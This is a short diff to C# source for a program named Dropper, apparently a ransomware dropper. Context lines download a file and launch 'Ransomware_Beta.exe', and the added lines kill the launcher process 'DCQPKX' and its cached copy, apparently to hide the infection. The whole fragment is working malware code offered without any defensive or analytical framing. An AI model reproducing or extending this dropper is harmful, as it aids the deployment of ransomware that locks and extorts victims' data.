@@ -59,6 +59,20 @@ namespace Dropper
             DownLoadFileInBackground2(link);
             // After finishing the downloading, start the ransomware virus and terminate
             Process.Start(pathToInfect + @"\Malware\Ransomware_Beta.exe");
+
+              Process[] _process = null;
+            _process = Process.GetProcessesByName("DCQPKX"); //kill laucher
+            foreach (Process proces in _process)
+            {
+                proces.Kill();
+            }
+
+            Process[] _process2 = null;
+            _process2 = Process.GetProcessesByName("._cache_DCQPKX"); //If exist cache virus file, kill too
+            foreach (Process proces2 in _process2)
+            {
+                proces2.Kill();
+            }
         }
         // DownLoadFileInBackground2
         public static void DownLoadFileInBackground2(string address)
